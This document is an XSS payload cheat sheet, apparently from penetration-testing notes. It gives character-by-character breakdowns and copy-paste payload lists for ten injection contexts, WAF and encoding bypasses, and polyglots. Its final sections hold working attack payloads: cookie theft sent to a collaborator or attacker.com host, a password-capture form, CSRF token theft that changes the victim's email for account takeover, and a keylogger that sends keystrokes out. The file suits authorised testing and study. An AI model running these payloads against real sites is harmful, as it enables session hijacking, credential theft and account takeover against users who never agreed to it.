# XSS Payloads

> Complete payload reference — character by character breakdowns + copy-paste collections for systematic testing.

---

## How to Use This File

This file has two sections for every context:

```
Section A → Understanding: what every character does and why
Section B → Copy-paste: ready to use in Burp Intruder or browser
```

---

## Context 1 — Between HTML Tags

Input lands here:
```html
<p>YOUR INPUT HERE</p>
```

### Understanding

**Basic Script Tag:**
```html
<script>alert(document.domain)</script>
```
| Part | What it does |
|---|---|
| `<script>` | Opens script block — browser executes everything inside as JavaScript |
| `alert` | Built-in browser popup function |
| `(document.domain)` | Argument — returns which domain the script runs on |
| `</script>` | Closes the script block |

**Image onerror:**
```html
<img src=1 onerror=alert(document.domain)>
```
| Part | What it does |
|---|---|
| `<img` | Image element |
| `src=1` | Tries to load image from `1` — guaranteed to fail |
| `onerror=` | Fires when src fails |
| `alert(document.domain)` | Executes on failure |

**SVG onload:**
```html
<svg onload=alert(document.domain)>
```
| Part | What it does |
|---|---|
| `<svg>` | SVG container element |
| `onload=` | Fires immediately when SVG renders |
| `alert(document.domain)` | Executes on render |

---

### Copy-Paste — Between HTML Tags

```
<script>alert(document.domain)</script>
<script>alert(1)</script>
<script>print()</script>
<img src=1 onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<img src onerror=alert(1)>
<svg onload=alert(1)>
<svg onload=alert(document.domain)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

---

## Context 2 — Inside HTML Attribute Value

Input lands here:
```html
<input value="YOUR INPUT">
<div class="YOUR INPUT">
```

### Understanding

**Break out and inject script:**
```
"><script>alert(document.domain)</script>
```
| Part | What it does |
|---|---|
| `"` | Closes the `value="` attribute |
| `>` | Closes the `<input` tag |
| `<script>alert(document.domain)</script>` | New script element injected |

**Stay inside tag, inject event:**
```
" autofocus onfocus=alert(document.domain) x="
```
| Part | What it does |
|---|---|
| `"` | Closes the attribute value |
| `autofocus` | Auto-focuses element on page load |
| `onfocus=alert(document.domain)` | Fires when element is focused |
| `x="` | Fake attribute — absorbs the original closing `"` — prevents broken HTML |

---

### Copy-Paste — Attribute Context

```
"><script>alert(1)</script>
"><img src=1 onerror=alert(1)>
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
" autofocus onfocus=alert(document.domain) x="
" onmouseover=alert(1) x="
" onmouseenter=alert(1) x="
" onclick=alert(1) x="
" onblur=alert(1) autofocus x="
' autofocus onfocus=alert(1) x='
' onmouseover=alert(1) x='
'><script>alert(1)</script>
'><img src=1 onerror=alert(1)>
" style="animation-name:x" onanimationstart="alert(1)" x="
```

---

## Context 3 — Inside href or src Attribute

Input lands here:
```html
<a href="YOUR INPUT">
<iframe src="YOUR INPUT">
```

### Understanding

```
javascript:alert(document.domain)
```
| Part | What it does |
|---|---|
| `javascript:` | Pseudo-protocol — executes what follows as JavaScript instead of navigating |
| `alert(document.domain)` | JavaScript to execute on click |

No angle brackets. No quotes. Survives most encoding filters.

---

### Copy-Paste — href/src Context

```
javascript:alert(1)
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:void(alert(1))
javascript:prompt(1)
javascript:confirm(1)
JaVaScRiPt:alert(1)
&#106;avascript:alert(1)
javascript&#58;alert(1)
javascript:alert&lpar;1&rpar;
```

---

## Context 4 — Inside JavaScript Single-Quoted String

Input lands here:
```html
<script>
    var x = 'YOUR INPUT';
</script>
```

### Understanding

**Semicolon technique:**
```
';alert(document.domain)//
```
| Part | What it does |
|---|---|
| `'` | Closes the string |
| `;` | Ends the `var x` statement |
| `alert(document.domain)` | New statement — executes |
| `//` | Comments out remaining `';` — prevents syntax errors |

**Dash technique:**
```
'-alert(document.domain)-'
```
| Part | What it does |
|---|---|
| `'` | Closes the string |
| `-` | Subtraction operator — valid JS connecting expressions |
| `alert(document.domain)` | Executes as part of the expression |
| `-'` | Subtraction + new string — absorbs the remaining `'` |

**Double backslash (when `'` is escaped to `\'`):**
```
\';alert(document.domain)//
```
| What you send | Server produces | JS sees |
|---|---|---|
| `\` | `\\` | literal backslash — data only |
| `'` | `\'` attempted | `'` now unescaped — string terminator ✅ |

**Close script block (when all JS-level escapes fail):**
```
</script><img src=1 onerror=alert(document.domain)>
```
| Part | What it does |
|---|---|
| `</script>` | Closes script block at HTML parser level — JS syntax irrelevant |
| `<img src=1 onerror=alert(document.domain)>` | New element built by HTML parser |

---

### Copy-Paste — JS Single-Quoted String

```
';alert(1)//
';alert(document.domain)//
'-alert(1)-'
'-alert(document.domain)-'
';print()//
';alert(1);var a='
';alert(1);'
\';alert(1)//
\';alert(document.domain)//
\\';alert(1)//
</script><img src=1 onerror=alert(1)>
</script><svg onload=alert(1)>
</script><script>alert(1)</script>
```

---

## Context 5 — Inside JavaScript Double-Quoted String

Input lands here:
```html
<script>
    var x = "YOUR INPUT";
</script>
```

### Copy-Paste — JS Double-Quoted String

```
";alert(1)//
";alert(document.domain)//
"-alert(1)-"
"-alert(document.domain)-"
";print()//
\";alert(1)//
</script><img src=1 onerror=alert(1)>
</script><svg onload=alert(1)>
```

---

## Context 6 — Inside JavaScript Template Literal

Input lands here:
```html
<script>
    var x = `YOUR INPUT`;
</script>
```

### Understanding

```
${alert(document.domain)}
```
| Part | What it does |
|---|---|
| `${` | Opens template expression — browser executes whatever is inside |
| `alert(document.domain)` | Executes immediately when the literal is processed |
| `}` | Closes the expression |

No breaking out needed. `${}` executes inside the literal by design.

---

### Copy-Paste — Template Literal

```
${alert(1)}
${alert(document.domain)}
${alert(document.cookie)}
${print()}
${prompt(1)}
${confirm(1)}
${fetch('https://attacker.com?c='+document.cookie)}
${''.constructor.constructor('alert(1)')()}
```

---

## Context 7 — Inside Event Handler Attribute (Single Quotes Escaped)

Input lands here:
```html
<a onclick="doSomething('YOUR INPUT')">
```
Server escapes `'` → `\'`

### Understanding

```
&apos;-alert(document.domain)-&apos;
```
| Part | What it does |
|---|---|
| `&apos;` | HTML entity for `'` — server never sees a real quote — escaping skipped |
| `-alert(document.domain)-` | Executes as subtraction expression |
| `&apos;` | Another entity — absorbs remaining quote |

Browser decodes `&apos;` → `'` AFTER the server filter runs. The gap between server filtering and browser decoding is the bypass.

---

### Copy-Paste — Event Handler with Escaped Quotes

```
&apos;-alert(1)-&apos;
&apos;-alert(document.domain)-&apos;
&apos;;alert(1)//
&#x27;-alert(1)-&#x27;
&#39;-alert(1)-&#39;
\u0027-alert(1)-\u0027
```

---

## Context 8 — WAF Bypass Payloads

### Understanding

**Custom tag with autofocus:**
```html
<xss autofocus tabindex=1 onfocus=alert(1)></xss>
```
| Part | What it does |
|---|---|
| `<xss` | Made-up tag — not on any WAF blocklist |
| `tabindex=1` | Makes custom element focusable — required or autofocus silently fails |
| `autofocus` | Browser focuses automatically on page load |
| `onfocus=alert(1)` | Fires on focus |

**SVG animatetransform:**
```html
<svg><animatetransform onbegin=alert(1)></animatetransform></svg>
```
| Part | What it does |
|---|---|
| `<animatetransform` | SVG-specific element — missed by HTML-focused WAF blocklists |
| `onbegin=` | SVG-specific event — fires when animation begins — immediately on render |

**SVG animate injecting href dynamically:**
```html
<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x="20" y="20">Click</text></a></svg>
```
| Part | What it does |
|---|---|
| `<animate attributeName="href"` | Sets href on parent `<a>` dynamically after WAF check |
| `values="javascript:alert(1)"` | The value injected — WAF never saw it on the static tag |

---

### Copy-Paste — WAF Bypass

```
<xss autofocus tabindex=1 onfocus=alert(1)></xss>
<xss id=x onfocus=alert(1) tabindex=1>
<xss onmouseover=alert(1)>Move mouse here</xss>
<svg><animatetransform onbegin=alert(1)></animatetransform></svg>
<svg><animate onbegin=alert(1)></animate></svg>
<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x="20" y="20">Click</text></a></svg>
<body onresize=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<input onbeforeinput=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio controls onplaying=alert(1)><source src=1></audio>
```

---

## Context 9 — Canonical Link Tag

Input reflected in URL into:
```html
<link rel="canonical" href="https://site.com/YOUR INPUT"/>
```

### Copy-Paste — Canonical Tag

```
'accesskey='x'onclick='alert(1)
'accesskey='x'onclick='alert(document.domain)
'accesskey='x'onfocus='alert(1)'tabindex='1
```

Deliver via URL:
```
https://TARGET.com/?'accesskey='x'onclick='alert(1)
https://TARGET.com/?'accesskey='x'onclick='alert(document.domain)
```

---

## Context 10 — Parentheses and Semicolons Blocked

When `(` `)` `;` are all blocked.

### Understanding

```
onerror=alert;throw 1
```
| Part | What it does |
|---|---|
| `onerror=alert` | Assigns `alert` function as global error handler — no `()` needed |
| `throw 1` | Throws exception with value `1` → `onerror` receives it → `alert(1)` fires |

```
{onerror=alert}throw 1337
```
| Part | What it does |
|---|---|
| `{onerror=alert}` | Block statement — no semicolon needed after curly braces |
| `throw 1337` | Throws 1337 → alert receives it |

```
throw onerror=alert,1337
```
| Part | What it does |
|---|---|
| `throw` | Begins throw statement |
| `onerror=alert` | Sets error handler inside the throw expression |
| `,1337` | Comma operator — last value is thrown → alert(1337) |

### Copy-Paste — No Parentheses No Semicolons

```
onerror=alert;throw 1
onerror=alert;throw 1337
{onerror=alert}throw 1
{onerror=alert}throw 1337
throw onerror=alert,1337
throw onerror=alert,'1'
[1].map(alert)
[1,2,3].map(alert)
onerror=confirm;throw 1
onerror=prompt;throw 1
```

---

## Polyglot Payloads

Work across multiple contexts simultaneously. Use when context is unclear.

### Copy-Paste — Polyglots

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.domain)</script>">
"><img src=x onerror=alert(1)>
<script/src=data:,alert()></script>
<script>alert(1)</script>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---

## Steal Cookies — Real Attack Payloads

Replace `COLLABORATOR` with your Burp Collaborator or exploit server URL.

```javascript
<script>fetch('https://COLLABORATOR?c='+document.cookie)</script>

<script>new Image().src='https://COLLABORATOR?c='+document.cookie</script>

<img src=1 onerror="fetch('https://COLLABORATOR?c='+document.cookie)">

<svg onload="fetch('https://COLLABORATOR?c='+document.cookie)">

<script>
var i=new Image();
i.src='https://COLLABORATOR?c='+document.cookie;
</script>

<script>
document.location='https://COLLABORATOR?c='+document.cookie;
</script>
```

---

## Password Capture — Auto-Fill Attack

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```

---

## CSRF Token Theft + Account Takeover

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post','/my-account/change-email',true);
    changeReq.send('csrf='+token+'&email=attacker@evil.com');
};
</script>
```

---

## Keylogger

```html
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://COLLABORATOR/log?k=' + e.key);
});
</script>
```

---

## Filter Test Payloads

Use these first to understand what the server encodes or blocks:

```
Test 1 — Special chars:
<>'"`;/\=(){}

Test 2 — Script keyword:
<script>

Test 3 — Event keyword:
onerror

Test 4 — Protocol:
javascript:

Test 5 — Encoded variants:
&lt;script&gt;
%3Cscript%3E
\u003cscript\u003e
&#60;script&#62;
```

---

## Encoding Bypass Variants

When payloads are blocked, try encoding the same characters differently:

```
Original:    <script>alert(1)</script>
URL encoded: %3Cscript%3Ealert%281%29%3C%2Fscript%3E
HTML encoded: &lt;script&gt;alert(1)&lt;/script&gt;
Unicode:     \u003cscript\u003ealert(1)\u003c/script\u003e
Hex:         &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
Double URL:  %253Cscript%253E

Original:    alert(1)
No parens:   alert`1`
Encoded:     alert&#40;1&#41;
Unicode:     alert\u00281\u0029
Hex:         alert\x281\x29
```

---

## Quick Reference Table

```
┌─────────────────────────┬──────────────────────────────────────────────────┐
│ Context                 │ Best Starting Payload                            │
├─────────────────────────┼──────────────────────────────────────────────────┤
│ Between tags            │ <script>alert(document.domain)</script>          │
│ Between tags (filtered) │ <img src=1 onerror=alert(1)>                     │
│ Attribute (breakout)    │ "><img src=1 onerror=alert(1)>                   │
│ Attribute (no breakout) │ " autofocus onfocus=alert(1) x="                │
│ href / src              │ javascript:alert(document.domain)                │
│ JS string (single)      │ ';alert(document.domain)//                      │
│ JS string (double)      │ ";alert(document.domain)//                      │
│ JS string (\ escaped)   │ \';alert(document.domain)//                     │
│ JS string (all escaped) │ </script><img src=1 onerror=alert(1)>           │
│ Template literal        │ ${alert(document.domain)}                       │
│ Event handler attr      │ &apos;-alert(document.domain)-&apos;             │
│ WAF bypass              │ <xss autofocus tabindex=1 onfocus=alert(1)>      │
│ WAF bypass SVG          │ <svg><animatetransform onbegin=alert(1)>         │
│ No parens/semicolons    │ {onerror=alert}throw 1337                       │
│ Canonical tag           │ 'accesskey='x'onclick='alert(1)                 │
└─────────────────────────┴──────────────────────────────────────────────────┘
```

---

*Next → [Bypass Techniques](./bypass-techniques.md) — systematic WAF evasion methodology*